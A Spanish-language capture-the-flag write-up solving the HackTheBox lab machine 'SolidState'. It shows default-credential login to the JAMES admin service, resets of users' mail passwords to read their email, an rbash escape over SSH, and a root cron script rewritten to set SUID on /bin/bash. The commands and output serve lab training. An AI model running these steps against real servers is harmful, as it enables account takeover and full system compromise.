---
title: HTB - SolidState
published: true
categories: [Linux]
tags: [eJPT, Media]
---

<img src="/assets/HTB/SolidState/solid.png">

¡Hola!
Vamos a resolver de la máquina `SolidState` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Abusing James Remote Administration Tool**
- **Changing a user's email password**
- **Information Leakage**
- **Escaping Restricted Bash (rbash)**
- **Creating a bash script in order to detect cron jobs (procmon.sh)**
- **Abusing Cron Job [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `SolidState`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.51
PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
64 bytes from 10.10.10.51: icmp_seq=1 ttl=63nma time=42.3 ms

--- 10.10.10.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn t establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### Reconocimiento Puertos Abiertos

* * *

Vemos puertos típicos como el 22 y 80 pero también vemos puertos relacionados con servicio email (25 - smtp, 110 - pop3) y el 4555 que tras una búsqueda en Google descubrimos que bajo este puerto corre `JAMES Remote Administration Tool`. Nos conectamos a este servicio por telnet y vemos que nos pide credenciales. Buscamos por credenciales por defecto y probamos usuario `root` y password `root`

```bash
❯ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Ejecutamos comando HELP para ver lista de posibles comandos

```bash
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```
```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Tenemos una lista de usuarios y la capacidad de cambiar su contraseña. Podemos cambiar la contraseña y loguearnos para ver emails de usuarios. 

```bash
setpassword john john123
Password for john reset
```

```ruby
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS john123
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```
No conseguimos nada con james y thomas pero con john sí. Localizamos un correo enviado por el mailadmin James a John en el que le pide que le genere credenciales nuevas a Mindy y se las envíe. Accedemos al correo de Mindy para comprobar si tiene algún correo con credenciales

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.157...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy123
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836

RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@**********

Respectfully,
James
```

Obtenemos credenciales de mindy. Vemos que no la ha cambiado todavía

```bash
❯ ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.123.157' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ 
```

Podemos acceder a la flag de usuario

```bash
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
614dc821367571e0e***************
```
Si tratamos de ejecutar cualquier comando veremos que estamos en una `restricted bash` por lo que estamos algo limitados pudiendo sólo ejecutar **cat**, **env** y **ls**

```bash
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ echo $PATH
/home/mindy/bin
mindy@solidstate:~$ ls bin/
cat  env  ls
```

Una manera de saltarse la limitación es cuando nos conectamos por ssh añadir un comando al final para que lo ejecute. Si no está bien configurado nos ejecutará el comando que le indiquemos

```bash
❯ ssh mindy@10.10.10.51 bash
mindy@10.10.10.51's password: 
whoami
mindy
```

Hemos ganado acceso a la máquina víctima! Hacemos un tratamiendo de la tty para tener una shell plenamente funcional y seguimos con la escalada de privilegios

### Escalada Privilegios

* * *

Vamos a crearnos un script para tratar de detectar tareas que se ejecuten en el sistema a intervalos regulares de tiempo. Para ello nos dirigimos a un directorio con capacidad de escritura como `/tmp` o  `/dev/shm` y creamos el script `procmon.sh`

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm; exit 1
}

#CTRL+C
trap ctrl_c INT
tput civis

old_process="$(ps -eo command)"

while true; do
	new_process="$(ps -eo command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
	old_process=$new_process
done
```
Al ejecutar el script nos da el siguiente output en donde vemos que a intervalos regulares se ejecuta un script en python que reside ne la carpeta `/opt` cuyo propietario y grupo son `root` perom tenemos permisos `rwx` en otros

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c python /opt/tmp.py
> python /opt/tmp.py
< /usr/sbin/CRON -f
< /bin/sh -c python /opt/tmp.py
< python /opt/tmp.py

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -la /opt/tmp.py 
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Llegados a este punto editamos el script y modificamos una línea para que nos asigne privilegios SUID a la bash y esperamos a que se ejecute el script

```bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod u+s /bin/bash')
except:
     sys.exit()
```

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
awk  root.txt
bash-4.4# cat root.txt 
cdf8fd6f52611fa41***************
```

Hemos completado la máquina **SolidState** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/SolidState/pwned.png">
